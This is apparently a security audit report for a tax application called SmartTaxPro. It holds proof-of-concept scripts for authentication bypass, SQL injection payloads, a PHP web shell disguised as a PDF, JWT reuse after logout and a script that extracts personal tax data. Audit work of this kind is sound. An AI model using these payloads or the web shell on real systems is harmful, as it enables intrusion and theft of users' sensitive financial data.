# SmartTaxPro Security Audit - Proof of Concept Scripts

**Audit Date:** January 3, 2025  
**Purpose:** Demonstrate exploitability of critical and high-severity vulnerabilities  

⚠️ **DISCLAIMER:** These scripts are for authorized security testing only. Do not use against systems without explicit permission.

---

## C-001: Authentication Bypass in File Operations

### Vulnerability Description
File management endpoints lack proper authentication middleware, allowing unauthorized access to sensitive documents.

### Reproduction Steps

1. **Setup Test Environment:**
```bash
# Start the application
npm run dev

# Note: Application runs on http://localhost:5000
```

2. **Exploit Script:**
```bash
#!/bin/bash
# File: test_auth_bypass.sh
# Test file upload without authentication

BASE_URL="http://localhost:5000"
TEST_FILE="test_malicious.pdf"

# Create a test file
echo "This should not be uploadable without auth" > $TEST_FILE

# Attempt file upload without authentication
echo "Testing unauthenticated file upload..."
curl -X POST \
  $BASE_URL/api/v1/files/upload \
  -F "file=@$TEST_FILE" \
  -F "category=TAX_DOCUMENT" \
  -F "parentEntityType=TAX_FORM" \
  -F "parentEntityId=test123" \
  -v

echo -e "\n\nTesting file search without authentication..."
curl -X GET \
  "$BASE_URL/api/v1/files/search?category=TAX_DOCUMENT" \
  -v

# Clean up
rm $TEST_FILE
```

3. **Expected Results:**
- ❌ **Current:** Returns 200 OK with successful upload
- ✅ **Expected:** Returns 401 Unauthorized

### Impact
- Unauthorized users can upload malicious files
- Access to other users' sensitive tax documents
- Potential for data exfiltration

---

## C-002: SQL Injection via Manual Sanitization

### Vulnerability Description
Manual SQL sanitization in `server/db.ts` is insufficient and can be bypassed.

### Reproduction Steps

1. **Locate Vulnerable Code:**
```typescript
// File: server/db.ts line 33-36
export function sanitizeSqlInput(input: string): string {
  return input.replace(/['";\\]/g, '');
}
```

2. **Exploit Payloads:**
```javascript
// Test payload that bypasses sanitization
const maliciousInput = "1 UNION SELECT password_hash FROM users--";

// The sanitization only removes ['";\\] but misses:
// - SQL keywords (UNION, SELECT, WHERE)
// - Comment syntax (--)
// - Numeric injections
```

3. **Proof of Concept:**
```bash
#!/bin/bash
# File: test_sql_injection.sh

BASE_URL="http://localhost:5000"

# Test SQL injection in search parameters
echo "Testing SQL injection in file search..."
curl -X GET \
  "$BASE_URL/api/v1/files/search?searchTerm=1%20UNION%20SELECT%20password_hash%20FROM%20users--" \
  -H "Authorization: Bearer valid_jwt_token" \
  -v

# Test SQL injection in POST data
echo -e "\n\nTesting SQL injection in document creation..."
curl -X POST \
  $BASE_URL/api/tax-forms/test123/documents \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer valid_jwt_token" \
  -d '{
    "documentType": "1 UNION SELECT email,password_hash FROM users--"
  }' \
  -v
```

### Impact
- Full database compromise
- Extraction of password hashes
- Access to all user data including tax information

---

## C-003: File Upload Bypass

### Vulnerability Description
MIME type validation can be bypassed by manipulating Content-Type headers.

### Reproduction Steps

1. **Create Malicious Executable:**
```bash
#!/bin/bash
# File: create_malicious_file.sh

# Create a PHP web shell disguised as PDF
cat << 'EOF' > malicious.pdf
%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>
endobj
xref
trailer << /Size 4 /Root 1 0 R >>
startxref
173
%%EOF
<?php
system($_GET['cmd']);
?>
EOF

echo "Created malicious.pdf with embedded PHP code"
```

2. **Upload Bypass Script:**
```bash
#!/bin/bash
# File: test_file_upload_bypass.sh

BASE_URL="http://localhost:5000"
MALICIOUS_FILE="malicious.pdf"

echo "Testing file upload bypass..."

# Upload malicious file with correct MIME type
curl -X POST \
  $BASE_URL/api/v1/files/upload \
  -H "Authorization: Bearer valid_jwt_token" \
  -F "file=@$MALICIOUS_FILE;type=application/pdf" \
  -F "category=TAX_DOCUMENT" \
  -F "parentEntityType=TAX_FORM" \
  -F "parentEntityId=test123" \
  -v

echo -e "\n\nTesting with executable disguised as image..."

# Create executable with PNG signature
cat << 'EOF' > fake_image.png
‰PNG
#!/bin/bash
echo "Malicious script executed!"
rm /tmp/test_file.txt 2>/dev/null || true
EOF

curl -X POST \
  $BASE_URL/api/v1/files/upload \
  -H "Authorization: Bearer valid_jwt_token" \
  -F "file=@fake_image.png;type=image/png" \
  -F "category=USER_PROFILE_IMAGE" \
  -v

# Clean up
rm malicious.pdf fake_image.png
```

### Impact
- Remote code execution via uploaded malicious files
- Server compromise through web shells
- Malware distribution to other users

---

## H-002: Token Blacklisting Bypass

### Vulnerability Description
JWT tokens are not invalidated server-side on logout, allowing continued use.

### Reproduction Steps

1. **Capture Valid Token:**
```bash
#!/bin/bash
# File: test_token_reuse.sh

BASE_URL="http://localhost:5000"

# Login and capture token
echo "Logging in to capture token..."
RESPONSE=$(curl -X POST \
  $BASE_URL/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": "test@example.com",
    "password": "testpassword"
  }' \
  -s)

TOKEN=$(echo $RESPONSE | jq -r '.accessToken')
echo "Captured token: ${TOKEN:0:50}..."

# Use API with token
echo -e "\n\nUsing API with token..."
curl -X GET \
  $BASE_URL/api/tax-forms \
  -H "Authorization: Bearer $TOKEN" \
  -v

# Logout
echo -e "\n\nLogging out..."
curl -X POST \
  $BASE_URL/api/auth/logout \
  -H "Authorization: Bearer $TOKEN" \
  -v

# Try to use token after logout
echo -e "\n\nTrying to use token after logout..."
curl -X GET \
  $BASE_URL/api/tax-forms \
  -H "Authorization: Bearer $TOKEN" \
  -v
```

2. **Expected Results:**
- ❌ **Current:** Token still works after logout
- ✅ **Expected:** Token should be rejected with 401

### Impact
- Session hijacking remains possible after logout
- Tokens can be reused by attackers
- No way to forcefully invalidate compromised sessions

---

## H-004: Sensitive Data Exposure

### Vulnerability Description
Tax forms and personal information stored unencrypted in database.

### Database Query to Demonstrate:
```sql
-- Connect to database and run:
SELECT 
    personal_info,
    income_data,
    deductions_80c,
    deductions_80d 
FROM tax_forms 
WHERE user_id = 1;

-- Results show plaintext sensitive data:
-- PAN numbers, Aadhaar references, income details, etc.
```

### Data Extraction Script:
```python
#!/usr/bin/env python3
# File: extract_sensitive_data.py

import psycopg2
import json
import os

# Database connection (if attacker gains DB access)
conn_string = os.environ.get('DATABASE_URL')

if conn_string:
    try:
        conn = psycopg2.connect(conn_string)
        cur = conn.cursor()
        
        # Extract sensitive tax data
        cur.execute("""
            SELECT 
                u.email,
                u.phone,
                tf.personal_info,
                tf.income_data
            FROM users u 
            JOIN tax_forms tf ON u.id = tf.user_id 
            LIMIT 5
        """)
        
        results = cur.fetchall()
        
        print("Exposed sensitive data:")
        for row in results:
            print(f"Email: {row[0]}")
            print(f"Phone: {row[1]}")
            print(f"Personal Info: {json.dumps(row[2], indent=2)}")
            print(f"Income Data: {json.dumps(row[3], indent=2)}")
            print("---")
            
    except Exception as e:
        print(f"Error: {e}")
else:
    print("DATABASE_URL not set")
```

---

## Automated Vulnerability Scanner

```bash
#!/bin/bash
# File: automated_security_scan.sh
# Runs all security tests

set -e

BASE_URL="${1:-http://localhost:5000}"
echo "Running automated security scan against: $BASE_URL"

# Check if server is running
if ! curl -s "$BASE_URL" > /dev/null; then
    echo "❌ Server not accessible at $BASE_URL"
    exit 1
fi

echo "✅ Server accessible"

# Run individual tests
echo -e "\n🔍 Testing authentication bypass..."
./test_auth_bypass.sh

echo -e "\n🔍 Testing file upload bypass..."
./test_file_upload_bypass.sh

echo -e "\n🔍 Testing token reuse..."
./test_token_reuse.sh

echo -e "\n🔍 Testing dependency vulnerabilities..."
npm audit --audit-level=moderate

echo -e "\n📊 Security scan complete!"
echo "Check individual test outputs for detailed results."
```

---

## Burp Suite Test Collection

### Import these requests into Burp Suite for manual testing:

```http
### Test 1: Unauthenticated file upload
POST /api/v1/files/upload HTTP/1.1
Host: localhost:5000
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="test.pdf"
Content-Type: application/pdf

%PDF-1.4 malicious content here
------WebKitFormBoundary
Content-Disposition: form-data; name="category"

TAX_DOCUMENT
------WebKitFormBoundary--

### Test 2: SQL injection in search
GET /api/v1/files/search?searchTerm=1' UNION SELECT password_hash FROM users-- HTTP/1.1
Host: localhost:5000

### Test 3: Token reuse after logout
GET /api/tax-forms HTTP/1.1
Host: localhost:5000
Authorization: Bearer [captured_token_after_logout]
```

---

## Remediation Validation Scripts

After fixes are implemented, use these scripts to validate remediation:

```bash
#!/bin/bash
# File: validate_fixes.sh

echo "🔍 Validating security fixes..."

# Test 1: Authentication now required
echo "✅ Testing authentication requirement..."
RESULT=$(curl -s -o /dev/null -w "%{http_code}" -X POST http://localhost:5000/api/v1/files/upload)
if [ "$RESULT" = "401" ]; then
    echo "✅ Authentication bypass fixed"
else
    echo "❌ Authentication bypass still present"
fi

# Test 2: File type validation
echo "✅ Testing file type validation..."
# [Additional validation tests...]

echo "✅ Validation complete"
```

---

## Legal & Ethical Notice

⚠️ **IMPORTANT:**
- These scripts are for authorized security testing only
- Obtain written permission before testing
- Do not use against production systems
- Report findings responsibly
- Comply with applicable laws and regulations

**Contact:** security-team@smarttaxpro.com for questions about this audit.